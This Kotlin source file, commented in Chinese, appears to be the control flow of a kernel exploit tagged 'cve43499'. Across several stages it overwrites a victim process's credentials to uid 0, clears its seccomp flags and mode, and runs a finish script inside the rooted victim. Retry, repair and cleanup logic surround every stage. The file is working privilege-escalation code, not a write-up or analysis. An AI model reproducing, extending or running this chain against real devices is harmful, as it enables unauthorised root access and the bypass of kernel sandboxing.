                    run.writeEvidence[EVIDENCE_PREBUILT_STATE] = PREBUILT_STATE_RETAINED
                    /* B1③：discard close-retained ⇒ 统一合同（W1 dirty ⇒ fail-stop；failStop=0 仍 Failed）。 */
                    requireCleanCloseAfterCred(
                        run,
                        "prebuild-discard",
                        retained = true,
                        allReleased = false,
                        termination = outcome.termination,
                    )
                    StepResult.Failed(
                        "cve43499:write.w1b:fast-repair-prebuild-retained:" + outcome.reason,
                        linkedMapOf<String, String>()
                            .apply {
                                putAll(retainedEvidence(run))
                                putAll(run.writeEvidence)
                                putAll(evidence)
                            },
                    )
                } else {
                    /* clean failure（discard 成功）⇒ W1 继续；W2 按 allowFullFallback 判定。 */
                    run.prebuildFailedReason = outcome.reason
                    evidence[EVIDENCE_PREBUILT_STATE] = PREBUILT_STATE_CLEAN_FAILED
                    evidence[EVIDENCE_W2_REPAIR_MODE] = W2_REPAIR_MODE_PREBUILD_CLEAN_FAILED
                    run.writeEvidence[EVIDENCE_PREBUILT_STATE] = PREBUILT_STATE_CLEAN_FAILED
                    run.writeEvidence[EVIDENCE_W2_REPAIR_MODE] =
                        W2_REPAIR_MODE_PREBUILD_CLEAN_FAILED
                    null
                }
            }
        }
    }

    /**
     * W1b step：multicast 私有 scratch 修复（Zero leaf 写 W1 页基址+buffer_size）。
     *
     * 无论成功/失败/skip，本 step 结束时都关闭 W1 链（legacy：release quarantine）。
     *
     * @param run 本次运行状态。
     * @return Done（repaired/skipped）/ 具名 Failed。
     */
    private suspend fun writeW1bStep(run: Cve43499FlowRunState): StepResult {
        val chain = run.runSpec.writeChain ?: return missingChain()
        val runner = run.writeRunner ?: return missingRunner()
        try {
            if (!chain.policy.w1bEnabled) {
                run.writeEvidence[EVIDENCE_W1B_STATE] = W1B_SKIPPED_ROUTE
                run.info("w1b skipped")
                run.debug("w1b state=skipped writes=0")
                val evidence = linkedMapOf(
                    EVIDENCE_W1B_STATE to W1B_SKIPPED_ROUTE,
                )
                /* Q1=B：W1b 成功出口（skip 视为成功）→ W2 前预建。 */
                prebuildRepairAtW1bExit(run, evidence)?.let { return it }
                return StepResult.Done(evidence)
            }
            val w1Facts = run.w1Facts
                ?: return StepResult.Failed("cve43499:write.w1b:w1-facts-missing")
            val request = chain.planner.w1b(w1Facts.candidatePageBase)
            var lastReason = "no-attempt"
            run.debug("w1b start writes=" + chain.policy.w1bWrites)
            for (attempt in 1..chain.policy.w1bWrites) {
                when (val outcome = runner.execute(Cve43499WriteStageId.W1B, request)) {
                    is Cve43499WriteTransactionStep.Executed -> {
                        /* W1b 事务链不需要保留：修复完成后立即关闭。 */
                        markExecuted(run, outcome.primitive)
                        closeLatestChain(run)
                        run.w1Facts = null
                        run.writeEvidence[EVIDENCE_W1B_STATE] = W1B_REPAIRED
                        run.writeEvidence[EVIDENCE_W1B_WRITES] = attempt.toString()
                        run.info("w1b repaired")
                        run.debug("w1b state=repaired writes=" + attempt)
                        val evidence = linkedMapOf(
                            EVIDENCE_W1B_STATE to W1B_REPAIRED,
                            EVIDENCE_W1B_WRITES to attempt.toString(),
                        )
                        /* Q1=B（task-73）：W1b 成功出口 → W2 前预建。 */
                        prebuildRepairAtW1bExit(run, evidence)?.let { return it }
                        return StepResult.Done(evidence)
                    }
                    is Cve43499WriteTransactionStep.RouteMiss -> {
                        lastReason = outcome.reason
                        settleUs(chain.policy.w1bSettleUs)
                    }
                    is Cve43499WriteTransactionStep.Failed -> {
                        if (outcome.retained) markRetained(run, "write.w1b", outcome.reason)
                        return StepResult.Failed(outcome.reason, retainedEvidence(run))
                    }
                }
            }
            return StepResult.Failed(
                "cve43499:write.w1b:repair-failed:" + lastReason,
                retainedEvidence(run),
            )
        } finally {
            /* legacy W1b 出口（成功=release quarantine / 失败=保持页）在 R3d 的线性
             * 架构里都由关闭 W1 链表达：dirty 链 close 会报 retained，不伪报释放。 */
            while (run.openChains > 0) {
                closeLatestChain(run)
            }
        }
    }

    /**
     * W2 step：Credential 写 attempts 循环；G05 prebuilt 最小事务 / fallback 修复。
     *
     * B1 统一合同（W2 cred 写成功后）：
     * - 所有 close/retained 过 [requireCleanCloseAfterCred]（W2 链、prebuilt activation/
     *   discard、clean-failure 后 close、repair actor close、fallback 链、closeAll 聚合）；
     * - dirty/retained ⇒ W2 `Failed("cve43499:write.w2:fast-repair-close-retained")` +
     *   G01 fail-stop（stage 具名），禁止 W3/finish/acceptance；failStop.enabled=0 时仍 Failed。
     *
     * @param run 本次运行状态。
     * @return Done（w2Attempts/w2Uid/w2Repairs/w2RepairMode）/ 具名 Failed。
     */
    private suspend fun writeW2Step(run: Cve43499FlowRunState): StepResult {
        val chain = run.runSpec.writeChain ?: return missingChain()
        val runner = run.writeRunner ?: return missingRunner()
        val baseline = captureVictimBaseline(run)
            ?: return StepResult.Failed(
                "cve43499:write.w2:write-targets-missing:victim-baseline-missing",
                retainedEvidence(run),
            )
        val context = Cve43499VictimContext(baseline) { iterations, budgetNanos ->
            pumpVictim(run, iterations, budgetNanos)
        }
        val acquisition = chain.targetSource.acquire(context)
        if (acquisition is Cve43499TargetAcquisition.Missing) {
            val evidence = linkedMapOf<String, String>()
            evidence.putAll(retainedEvidence(run))
            if (acquisition.closeRetained) {
                evidence[EVIDENCE_PERF_CLOSE_RETAINED] = "true"
            }
            return StepResult.Failed(
                "cve43499:write.w2:write-targets-missing:" + acquisition.reason,
                evidence,
            )
        }
        val acquired = acquisition as Cve43499TargetAcquisition.Acquired
        val precheckFailure = w2Precheck(run, acquired)
        if (precheckFailure != null) {
            return StepResult.Failed(
                "cve43499:write.w2:w2-precheck:" + precheckFailure,
                retainedEvidence(run),
            )
        }
        run.writeEvidence[EVIDENCE_W2_PRECHECK] = "ok"
        run.debug("w2 precheck=ok")
        recordTargetEvidence(run, acquired.evidence)
        settleUs(acquired.evidence.settleUs)
        val victimTask = acquired.victimTaskAddress
        if (victimTask == 0L) {
            return StepResult.Failed(
                "cve43499:write.w2:write-targets-missing:zero-address",
                retainedEvidence(run),
            )
        }
        run.victimTaskAddress = victimTask
        run.writeEvidence[EVIDENCE_VICTIM_TASK] = formatAddress(victimTask)
        val credential = chain.planner.credential(victimTask)
        val repair = chain.planner.fastRepair()
        var lastReason = "no-attempt"
        var repairsUsed = 0
        var repairMode = W2_REPAIR_MODE_NONE
        run.debug("w2 start attempts=" + chain.policy.w2Attempts)
        for (attempt in 1..chain.policy.w2Attempts) {
            when (val outcome = runner.execute(Cve43499WriteStageId.W2, credential)) {
                is Cve43499WriteTransactionStep.Executed -> {
                    markExecuted(run, outcome.primitive)
                    val w2Close = closeLatestChain(run)
                    run.actorConsumerSuccess = outcome.consumerSuccess
                    run.landingReclaimSends = outcome.reclaimSends
                    run.bindingPrimitive = outcome.primitive
                    if (chain.policy.fastRepairPrebuildEnabled) {
                        /* B1①：W2 链 close 过统一合同。 */
                        requireCleanCloseAfterCred(run, "w2-chain", w2Close)?.let { token ->
                            return StepResult.Failed(token, closeContractEvidence(run))
                        }
                    }
                    if (chain.policy.fastRepairEnabled) {
                        val prebuiltEnabled = chain.policy.fastRepairPrebuildEnabled
                        val prebuiltAvailable = run.lifecycle.prebuiltRepairAvailable()
                        when {
                            prebuiltEnabled && prebuiltAvailable -> {
                                val repairStart = run.runSpec.elapsedRealtimeNanos()
                                val repaired = runner.executePrebuiltRepair(
                                    Cve43499WriteStageId.W2_REPAIR,
                                )
                                val repairUs =
                                    (run.runSpec.elapsedRealtimeNanos() - repairStart) / 1_000L
                                run.writeEvidence[EVIDENCE_W2_REPAIR_US] = repairUs.toString()
                                run.writeEvidence[EVIDENCE_W2_REPAIR_MODE] =
                                    W2_REPAIR_MODE_PREBUILT
                                when (repaired) {
                                    is Cve43499PrebuiltRepairStep.Executed -> {
                                        /* B1②/⑤：activation/repair actor close 合同。 */
                                        requireCleanCloseAfterCred(
                                            run,
                                            "prebuilt-repair",
                                            repaired.closeReceipt,
                                        )?.let { token ->
                                            return StepResult.Failed(
                                                token,
                                                closeContractEvidence(run),
                                            )
                                        }
                                        recordRepairTiming(run, repaired.timing)
                                        markExecuted(run, repaired.primitive)
                                        repairsUsed++
                                        repairMode = W2_REPAIR_MODE_PREBUILT
                                        /* 最小事务成功后必须复查 uid：prebuilt 只允许用一次，
                                         * 成功后不再进入下一 attempt（否则 prebuilt 已消费 ⇒ false fail）。 */
                                        val repairedProbe = run.lifecycle.victimUid()
                                        if (repairedProbe.uid == 0L) {
                                            run.writeEvidence[EVIDENCE_W2_ATTEMPTS] =
                                                attempt.toString()
                                            run.writeEvidence[EVIDENCE_W2_UID] = "0"
                                            run.info("w2 cred ok")
                                            return StepResult.Done(
                                                linkedMapOf(
                                                    EVIDENCE_W2_ATTEMPTS to attempt.toString(),
                                                    EVIDENCE_W2_REPAIRS to repairsUsed.toString(),
                                                    EVIDENCE_W2_UID to "0",
                                                    EVIDENCE_W2_REPAIR_MODE to repairMode,
                                                ).apply { putAll(run.writeEvidence) },
                                            )
                                        }
                                    }
                                    is Cve43499PrebuiltRepairStep.Failed -> {
                                        /* Q2：cred 已写成功后 repair 失败 ⇒ W2 fail-stop；
                                         * dirty/retained 用统一 close-retained token。 */
                                        val closeStage = if (repaired.reason.contains("prepare-actor") ||
                                            repaired.reason.contains("actor-execute")
                                        ) {
                                            "clean-failure"
                                        } else {
                                            "activation"
                                        }
                                        val reason = if (repaired.retained) {
                                            requireCleanCloseAfterCred(
                                                run,
                                                closeStage,
                                                retained = true,
                                                allReleased = false,
                                                termination = repaired.termination,
                                            ) ?: W2_CLOSE_RETAINED_TOKEN
                                        } else {
                                            "cve43499:write.w2:fast-repair-activate-failed:" +
                                                repaired.reason
                                        }
                                        val evidence = closeContractEvidence(run).toMutableMap()
                                        evidence[EVIDENCE_PREBUILT_STATE] =
                                            if (repaired.retained) {
                                                PREBUILT_STATE_RETAINED
                                            } else {
                                                PREBUILT_STATE_CLEAN_FAILED
                                            }
                                        return StepResult.Failed(reason, evidence)
                                    }
                                }
                            }
                            prebuiltEnabled -> {
                                /* B2：prebuild clean failure ⇒ 默认 W2 具名失败；仅
                                 * allowFullFallback=true 才允许完整 fallback（panic 窗口不改善）。 */
                                if (!chain.policy.allowFullFallback) {
                                    return StepResult.Failed(
                                        "cve43499:write.w2:fast-repair-prebuilt-required:" +
                                            (run.prebuildFailedReason ?: "prebuilt-unavailable"),
                                        closeContractEvidence(run),
                                    )
                                }
                                when (val fallback = runner.execute(
                                    Cve43499WriteStageId.W2_REPAIR,
                                    repair,
                                )) {
                                    is Cve43499WriteTransactionStep.Executed -> {
                                        markExecuted(run, fallback.primitive)
                                        val fallbackClose = closeLatestChain(run)
                                        /* B1⑥：full fallback 链 close 亦过合同。 */
                                        requireCleanCloseAfterCred(
                                            run,
                                            "w2-fallback",
                                            fallbackClose,
                                        )?.let { token ->
                                            return StepResult.Failed(
                                                token,
                                                closeContractEvidence(run),
                                            )
                                        }
                                        repairsUsed++
                                        repairMode = W2_REPAIR_MODE_FULL_FALLBACK
                                    }
                                    is Cve43499WriteTransactionStep.RouteMiss ->
                                        return StepResult.Failed(
                                            "cve43499:write.w2:fast-repair-route-miss:" +
                                                fallback.reason,
                                            closeContractEvidence(run),
                                        )
                                    is Cve43499WriteTransactionStep.Failed -> {
                                        if (fallback.retained) {
                                            markRetained(
                                                run,
                                                "write.w2.fast-repair",
                                                fallback.reason,
                                            )
                                        }
                                        return StepResult.Failed(
                                            fallback.reason,
                                            closeContractEvidence(run),
                                        )
                                    }
                                }
                            }
                            else -> {
                                /* 开关关闭：保持既有路径与语义（零行为变化）。 */
                                when (val repaired = runner.execute(
                                    Cve43499WriteStageId.W2_REPAIR,
                                    repair,
                                )) {
                                    is Cve43499WriteTransactionStep.Executed -> {
                                        markExecuted(run, repaired.primitive)
                                        closeLatestChain(run)
                                        repairsUsed++
                                        repairMode = W2_REPAIR_MODE_NONE
                                    }
                                    is Cve43499WriteTransactionStep.RouteMiss ->
                                        return StepResult.Failed(
                                            "cve43499:write.w2:fast-repair-route-miss:" +
                                                repaired.reason,
                                            retainedEvidence(run),
                                        )
                                    is Cve43499WriteTransactionStep.Failed -> {
                                        if (repaired.retained) {
                                            markRetained(
                                                run,
                                                "write.w2.fast-repair",
                                                repaired.reason,
                                            )
                                        }
                                        return StepResult.Failed(
                                            repaired.reason,
                                            retainedEvidence(run),
                                        )
                                    }
                                }
                            }
                        }
                    }
                    settleUs(chain.policy.w2SettleUs)
                    run.w2CredWriteSucceeded = true
                    run.writeEvidence[EVIDENCE_W2_REPAIR_MODE] = repairMode
                    run.writeEvidence[EVIDENCE_W2_REPAIRS] = repairsUsed.toString()
                    val probe = run.lifecycle.victimUid()
                    if (probe.uid == 0L) {
                        run.writeEvidence[EVIDENCE_W2_ATTEMPTS] = attempt.toString()
                        run.writeEvidence[EVIDENCE_W2_UID] = "0"
                        run.info("w2 cred ok")
                        run.debug(
                            "w2 cred attempt=" + attempt + " result=routed repair=" + repairMode,
                        )
                        return StepResult.Done(
                            linkedMapOf(
                                EVIDENCE_W2_ATTEMPTS to attempt.toString(),
                                EVIDENCE_W2_REPAIRS to repairsUsed.toString(),
                                EVIDENCE_W2_UID to "0",
                                EVIDENCE_W2_REPAIR_MODE to repairMode,
                            ).apply { putAll(run.writeEvidence) },
                        )
                    }
                    lastReason = "uid=" + (probe.uid?.toString() ?: probe.failureReason)
                    settleUs(chain.policy.verifyBackoffUs)
                }
                is Cve43499WriteTransactionStep.RouteMiss -> {
                    lastReason = outcome.reason
                    settleUs(chain.policy.attemptBackoffUs)
                }
                is Cve43499WriteTransactionStep.Failed -> {
                    if (outcome.retained) markRetained(run, "write.w2", outcome.reason)
                    return StepResult.Failed(outcome.reason, retainedEvidence(run))
                }
            }
        }
        return StepResult.Failed(
            "cve43499:write.w2:unverified:" + lastReason,
            retainedEvidence(run),
        )
    }

    /**
     * G05/B1 统一合同：W2 cred 写成功后任何 close 回执必须是 clean。
     *
     * @param run 本次运行状态。
     * @param stage 具名 close 阶段（`w2-chain`/`prebuilt-repair`/`w2-fallback`/...）。
     * @param receipt 单链 close 回执（或聚合回执映射的等价值）。
     * @return null=clean；否则统一 token（已 markRetained/触发 G01 fail-stop）。
     * @note failStop.enabled=0 时仍返回 token（B1 不依赖终止）。
     */
    private fun requireCleanCloseAfterCred(
        run: Cve43499FlowRunState,
        stage: String,
        receipt: Cve43499ChainCloseReceipt,
    ): String? {
        if (receipt.allReleased && !receipt.retained) return null
        markRetained(run, "write.w2." + stage, "close-retained:" + receipt.termination)
        return W2_CLOSE_RETAINED_TOKEN
    }

    /**
     * B1 统一合同（非链对象版本：discard/activation/clean-failure 的 retained 标记）。
     *
     * @param run 本次运行状态。
     * @param stage 具名 close 阶段（`prebuild-discard`/`activation`/`clean-failure`）。
     * @param retained 是否 retained/dirty。
     * @param allReleased 是否全部干净释放。
     * @param termination 终结证据。
     * @return null=clean；否则统一 close-retained token（并已 markRetained/触发 G01）。
     */
    private fun requireCleanCloseAfterCred(
        run: Cve43499FlowRunState,
        stage: String,
        retained: Boolean,
        allReleased: Boolean,
        termination: String,
    ): String? {
        if (allReleased && !retained) return null
        markRetained(run, "write.w2." + stage, "close-retained:" + termination)
        return W2_CLOSE_RETAINED_TOKEN
    }

    /** @return 合同失败 evidence（retained + 已累计写链证据）。 */
    private fun closeContractEvidence(run: Cve43499FlowRunState): Map<String, String> =
        linkedMapOf<String, String>().apply {
            putAll(retainedEvidence(run))
            putAll(run.writeEvidence)
        }

    /** @param run 运行状态；@param timing 最小事务分项计时（I2）。 */
    private fun recordRepairTiming(run: Cve43499FlowRunState, timing: Cve43499RepairTiming) {
        run.writeEvidence[EVIDENCE_W2_REPAIR_ACTIVATION_US] =
            timing.activationUs.toString()
        run.writeEvidence[EVIDENCE_W2_REPAIR_EXECUTE_US] = timing.executeUs.toString()
        run.writeEvidence[EVIDENCE_W2_REPAIR_CLOSE_US] = timing.closeUs.toString()
        run.writeEvidence[EVIDENCE_W2_REPAIR_US] = timing.totalUs.toString()
    }

    /**
     * W3/finish 前 post-cred 资源预检（B1⑦：closeAll 晚发现 retained 不能只事后失败）。
     *
     * @param run 本次运行状态。
     * @return null=可继续；非 null=W2 统一失败（acceptance 不可达）。
     */
    private fun requireCleanPostCredPreflight(run: Cve43499FlowRunState): StepResult? {
        if (!run.w2CredWriteSucceeded) return null
        while (run.openChains > 0) {
            val receipt = closeLatestChain(run)
            requireCleanCloseAfterCred(run, "post-cred-preflight", receipt)?.let { token ->
                return StepResult.Failed(token, closeContractEvidence(run))
            }
        }
        if (run.retainedResources) {
            markRetained(run, "write.post-cred", "post-cred-retained")
            return StepResult.Failed(W2_CLOSE_RETAINED_TOKEN, closeContractEvidence(run))
        }
        return null
    }

    /*
     * G05 B1 close 合同覆盖（gate `tools/verify_43499_finish_victim_only.py` 断言这些 stage 名存在）：
     * 1) w2-chain（W2 cred 链 close）
     * 2) prebuilt-repair（repair actor close，含 activation 后最小事务）
     * 3) w2-fallback（allowFullFallback 完整 fallback 链 close）
     * 4) prebuild-discard（W1 出口 clean failure discard；retained 直接 W1 fail-stop）
     * 5) activation（activation 失败 close/retained；Q2 后 W2 fail-stop）
     * 6) clean-failure（prepareActor/executeActor clean-failure 后 close 回执判定）
     * 7) closeAll（lifecycle.close 聚合 + cleanup 兜底）
     * 统一判定点：[requireCleanCloseAfterCred]（failStop.enabled=0 时仍 Failed）。
     */
    /**
     * G04 W3 硬门前置（P1/P2/P3/P4/P7/P8；双源一致才 PASS）。
     *
     * @param run 本次运行状态。
     * @return null=PASS（w3GatePassed=true + evidence）；非 null=具名 Failed（G01 fail-stop）。
     * @note P5/P6 由既有 leaf 方向/close 合同路径复核；J self-probe 依赖 Native opcode
     *   append（task-56 冲突 → 本批延后，缺失即 FAIL，不静默 fallback）。
     */
    private fun w3GatePreflight(run: Cve43499FlowRunState): StepResult? {
        val before = run.victimBefore
        val after = run.victimAfter ?: run.lifecycle.victimSnapshot()
        val selfStatus = run.lifecycle.victimStatus()
        val uidProbe = run.lifecycle.victimUid()
        val gate = run.w3Gate
        val pre = gate.evaluatePre(
            Cve43499W3HardGate.PreInput(
                victimPid = after?.pid ?: 0,
                startTimeBefore = before?.startTimeTicks ?: 0L,
                startTimeAfter = after?.startTimeTicks ?: 0L,
                victimUid = uidProbe.uid,
                selfStatus = selfStatus,
                seccompBefore = selfStatus
                    ?.toString(Charsets.UTF_8)
                    ?.let { Cve43499W3HardGate.parseStatus(it)?.seccomp },
                bootId = null,
                ksuGuard = run.writeEvidence["ksuGuard"] ?: "absent",
                finishPrereqOk = run.lifecycle.victimRooted(),
            ),
        )
        run.writeEvidence.putAll(pre.evidence)
        if (!pre.passed) {
            val reason = pre.reason ?: "gate-unknown"
            run.writeEvidence[EVIDENCE_W3_GATE] = "FAIL"
            run.writeEvidence[EVIDENCE_W3_FAIL_REASON] = reason
            run.writeEvidence[EVIDENCE_W3_COLD_REBOOT] = "true"
            markRetained(run, "write.w3", reason)
            return StepResult.Failed(
                "cve43499:write.w3:" + reason,
                closeContractEvidence(run),
            )
        }
        run.w3GatePassed = true
        run.writeEvidence[EVIDENCE_W3_GATE] = "PASS"
        run.debug("w3 gate=PASS")
        return null
    }

    /**
     * W3 step：leaf 方向探针（非精确 target route）+ TIF_SECCOMP/thread_info.flags 与
     * seccomp.mode 清零；链轮次 >1 需要 victim restarter seam（缺失即 1 轮）。
     *
     * @param run 本次运行状态。
     * @return Done（rounds/attempts/leafDirection）/ 具名 Failed。
     */
    private suspend fun writeW3Step(run: Cve43499FlowRunState): StepResult {
        /* B1⑦：W3 前 post-cred 资源预检；晚发现 retained ⇒ acceptance 不可达。 */
        requireCleanPostCredPreflight(run)?.let { return it }
        val chain = run.runSpec.writeChain ?: return missingChain()
        /* G04/E7 W3 硬门（P1–P4/P7/P8 前置；P5/P6 由既有方向/close 路径保证）。
         * 失败 ⇒ Failed + G01 fail-stop + coldRebootRequired evidence（terminate 前 fsync）。 */
        w3GatePreflight(run)?.let { return it }
        val runner = run.writeRunner ?: return missingRunner()
        var task = run.victimTaskAddress
            ?: return StepResult.Failed("cve43499:write.w3:victim-task-missing")
        val maxRounds = if (chain.victimRestarter != null) {
            chain.policy.w3ChainRounds
        } else {
            1
        }
        var lastReason = "no-attempt"
        run.debug("w3 start rounds=" + maxRounds + " attempts=" + chain.policy.w3Attempts)
        for (round in 1..maxRounds) {
            val leafToTargetPlus8 = resolveLeafDirection(run, chain, runner, task)
                ?: return leafDirectionFailure(run)
            val flagsRequest = chain.planner.w3Flags(
                victimTaskAddress = task,
                leafToTargetPlus8 = leafToTargetPlus8,
                threadInfoFlagsOffset = chain.policy.threadInfoFlagsOffset,
            )
            val modeRequest = chain.planner.w3SeccompMode(
                victimTaskAddress = task,
                leafToTargetPlus8 = leafToTargetPlus8,
            )
            for (attempt in 1..chain.policy.w3Attempts) {
                when (val flags = runner.execute(Cve43499WriteStageId.W3, flagsRequest)) {
                    is Cve43499WriteTransactionStep.Executed -> {
                        markExecuted(run, flags.primitive)
                        closeLatestChain(run)
                    }
                    is Cve43499WriteTransactionStep.RouteMiss -> {
                        lastReason = flags.reason
                        settleUs(chain.policy.attemptBackoffUs)
                        continue
                    }
                    is Cve43499WriteTransactionStep.Failed -> {
                        if (flags.retained) markRetained(run, "write.w3.flags", flags.reason)
                        return StepResult.Failed(flags.reason, retainedEvidence(run))
                    }
                }
                settleUs(chain.policy.w3SettleUs)
                when (val mode = runner.execute(Cve43499WriteStageId.W3, modeRequest)) {
                    is Cve43499WriteTransactionStep.Executed -> {
                        markExecuted(run, mode.primitive)
                        closeLatestChain(run)
                    }
                    is Cve43499WriteTransactionStep.RouteMiss -> {
                        lastReason = mode.reason
                        settleUs(chain.policy.attemptBackoffUs)
                        continue
                    }
                    is Cve43499WriteTransactionStep.Failed -> {
                        if (mode.retained) markRetained(run, "write.w3.mode", mode.reason)
                        return StepResult.Failed(mode.reason, retainedEvidence(run))
                    }
                }
                settleUs(chain.policy.w3SettleUs)
                when (chain.verifier.verifyW3()) {
                    Cve43499WriteVerifyVerdict.VERIFIED -> {
                        run.writeEvidence[EVIDENCE_W3_ROUNDS] = round.toString()
                        run.writeEvidence[EVIDENCE_W3_ATTEMPTS] = attempt.toString()
                        run.writeEvidence[EVIDENCE_W3_LEAF_DIRECTION] =
                            if (leafToTargetPlus8) LEAF_TARGET_PLUS_8 else LEAF_EXACT
                        run.info("w3 gate ok")
                        run.debug(
                            "w3 leaf=" + if (leafToTargetPlus8) LEAF_TARGET_PLUS_8 else LEAF_EXACT,
                        )
                        return StepResult.Done(
                            linkedMapOf(
                                EVIDENCE_W3_ROUNDS to round.toString(),
                                EVIDENCE_W3_ATTEMPTS to attempt.toString(),
                                EVIDENCE_W3_LEAF_DIRECTION to
                                    if (leafToTargetPlus8) {
                                        LEAF_TARGET_PLUS_8
                                    } else {
                                        LEAF_EXACT
                                    },
                            ),
                        )
                    }
                    Cve43499WriteVerifyVerdict.UNVERIFIED -> {
                        lastReason = "seccomp-probe-unverified"
                        settleUs(chain.policy.verifyBackoffUs)
                    }
                    Cve43499WriteVerifyVerdict.UNSUPPORTED -> return StepResult.Failed(
                        "cve43499:write.w3:seccomp-probe-unsupported",
                        retainedEvidence(run),
                    )
                }
            }
            if (round < maxRounds) {
                val restarter = chain.victimRestarter
                    ?: return StepResult.Failed(
                        "cve43499:write.w3:unverified:" + lastReason,
                        retainedEvidence(run),
                    )
                val newTask = restarter.restart(run.lifecycle)
                    ?: return StepResult.Failed(
                        "cve43499:write.w3:victim-restart-failed",
                        retainedEvidence(run),
                    )
                task = newTask
                run.victimTaskAddress = newTask
                run.writeEvidence[EVIDENCE_VICTIM_TASK] = formatAddress(newTask)
            }
        }
        return StepResult.Failed(
            "cve43499:write.w3:unverified:" + lastReason,
            retainedEvidence(run),
        )
    }

    /**
     * W3-0 leaf 方向探针（仅非精确 target route；legacy `W3-0: leaf dir`）。
     *
     * @param run 本次运行状态。
     * @param chain 多写链输入。
     * @param runner 写事务执行器。
     * @param victimTask victim task 地址。
     * @return true=leaf 写落在 target+8；false=精确命中；null=无判据/失败。
     */
    private suspend fun resolveLeafDirection(
        run: Cve43499FlowRunState,
        chain: Cve43499WriteChain,
        runner: Cve43499WriteTransactionRunner,
        victimTask: Long,
    ): Boolean? {
        if (chain.policy.w3ExactTarget) {
            /* tcp：legacy `w3_exact_target=true`，不需要方向探针（精确命中）。 */
            return false
        }
        val request = chain.planner.w3CommProbe(victimTask)
        for (attempt in 1..chain.policy.w3LeafProbeAttempts) {
            when (val outcome = runner.execute(Cve43499WriteStageId.W3, request)) {
                is Cve43499WriteTransactionStep.Executed -> {
                    markExecuted(run, outcome.primitive)
                    closeLatestChain(run)
                }
                is Cve43499WriteTransactionStep.RouteMiss -> {
                    settleUs(chain.policy.attemptBackoffUs)
                    continue
                }
                is Cve43499WriteTransactionStep.Failed -> {
                    if (outcome.retained) markRetained(run, "write.w3.leaf-probe", outcome.reason)
                    return null
                }
            }
            settleUs(chain.policy.w3LeafProbeSettleUs)
            when (val direction = chain.verifier.leafDirection()) {
                Cve43499LeafDirection.TARGET_PLUS_8 -> return true
                Cve43499LeafDirection.EXACT -> return false
                null -> return null
            }
        }
        return null
    }

    /**
     * @param run 本次运行状态。
     * @return leaf 方向探针失败的具名 StepResult。
     */
    private fun leafDirectionFailure(run: Cve43499FlowRunState): StepResult =
        StepResult.Failed(
            "cve43499:write.w3:leaf-direction-unsupported",
            retainedEvidence(run),
        )

    /* ==================================================================== */
    /* 共享 step 实现                                                        */
    /* ==================================================================== */

    /**
     * victim 启动 step（两种模式共享）。
     *
     * @param run 本次运行状态。
     * @return Done（victimStartTimeTicks）/ 具名 Failed。
     */
    private fun victimStartStep(run: Cve43499FlowRunState): StepResult {
        val failure = run.lifecycle.startVictim()
        if (failure != null) {
            return StepResult.Failed(
                "cve43499:victim.start:" + failure,
                mapOf(EVIDENCE_RUN_ID to run.runId),
            )
        }
        val snapshot = run.lifecycle.victimSnapshot()
            ?: return StepResult.Failed("cve43499:victim.start:victim-identity-missing")
        run.victimBefore = snapshot
        run.info("victim start ok")
        run.debug("victim rooted=" + run.lifecycle.victimRooted())
        return StepResult.Done(
            linkedMapOf(
                EVIDENCE_VICTIM_STARTTIME to snapshot.startTimeTicks.toString(),
            ),
        )
    }

    /**
     * 清理：成功/失败/取消路径都由基类调用一次；兜底 `closeAll()`（幂等）。
     */
    override suspend fun cleanup() {
        val run = activeRun ?: return
        if (!run.closed) {
            val receipt = run.lifecycle.closeAll()
            run.closed = true
            run.termination = receipt.termination
            /* task-84：证据只降不升（先前失败/未尝试不得被后一次 clean 覆盖）。 */
            val priorReleased = run.resourcesReleased
            run.resourcesReleased = receipt.allReleased && (priorReleased != false)
            run.retainedResources = receipt.retained
            run.rootedChildParked = receipt.parkedRootedChild
            run.openChains = 0
            if (receipt.retained && !receipt.parkedRootedChild) {
                if (run.w2CredWriteSucceeded) {
                    markRetained(
                        run,
                        "write.w2.close-all-cleanup",
                        "close-all-retained:" + receipt.termination,
                    )
                } else {
                    triggerFailStop(run, "lifecycle.cleanup", receipt.termination)
                }
            }
        }
        activeRun = null
    }

    /**
     * victim 身份复查（starttime 未变）+ uid 探测。
     *
     * @param run 本次运行状态。
     * @return Done（uid/starttime evidence）或具名 Failed。
     */
    private fun victimProbeStep(run: Cve43499FlowRunState): StepResult {
        val after = run.lifecycle.victimSnapshot()
            ?: return StepResult.Failed("cve43499:victim.probe:victim-identity-missing-after-execute")
        val before = run.victimBefore
        if (before != null && before.startTimeTicks != after.startTimeTicks) {
            return StepResult.Failed("cve43499:victim.probe:victim-starttime-changed")
        }
        run.victimAfter = after
        val probe: Cve43499UidProbe = run.lifecycle.victimUid()
        val uid = probe.uid
            ?: return StepResult.Failed(
                "cve43499:victim.probe:" + (probe.failureReason ?: "uid-probe-failed"),
            )
        run.observedUid = uid
        return StepResult.Done(
            linkedMapOf(
                EVIDENCE_UID to uid.toString(),
                EVIDENCE_VICTIM_STARTTIME to after.startTimeTicks.toString(),
            ),
        )
    }

    /**
     * 有界执行收尾脚本 step（两种模式共享；A1 finish victim-only）。
     *
     * **唯一执行点 = rooted victim**（legacy 'G' 语义）：
     * 1. victim rooted ⇒ 先在 victim 内校验 handoff 脚本对象 SHA-256（不匹配置
     *    Refused），再经 `VictimFinish`（victim `execScript`）执行，记录
     *    exit/timedOut/output SHA/markers；
     * 2. victim 未 rooted/不可用 ⇒ **不执行** App/su 路径（不触碰 `finishExecutor` /
     *    FinishExecution / `su -c`），直接返回具名 Refused
     *    `cve43499:finish.execute:su-fallback-refused`。
     *
     * @param run 本次运行状态。
     * @return Done（executionExitCode/finishSource）或具名 Failed。
     * @note `Flow43499RunSpec.finishExecutor` 字段保留但 @Deprecated、不再被执行。
     */
    private fun finishExecuteStep(run: Cve43499FlowRunState): StepResult {
        /* B1⑦：finish 前 post-cred 资源预检。 */
        requireCleanPostCredPreflight(run)?.let { return it }
        /* G04 P7/finish 前置：多写链/non-N/A 必须 W3 gate PASS。 */
        if (run.runSpec.writeChain != null && run.w2CredWriteSucceeded && !run.w3GatePassed) {
            return StepResult.Failed(
                "cve43499:finish.execute:gate-finish-prereq",
                closeContractEvidence(run),
            )
        }
        return if (run.lifecycle.victimRooted()) {
            finishExecuteViaVictim(run)
        } else {
            /* A1：无 rooted victim 不允许任何 App/su 执行；token 保持既有冻结字符串。 */
            StepResult.Failed("cve43499:finish.execute:su-fallback-refused")
        }
    }

    /**
     * rooted victim 内执行 finish 脚本（R3f）。
     *
     * @param run 本次运行状态。
     * @return Done（exit/source/output 摘要）或具名 Failed（脚本对象不符/victim 失败）。
     */
    /**
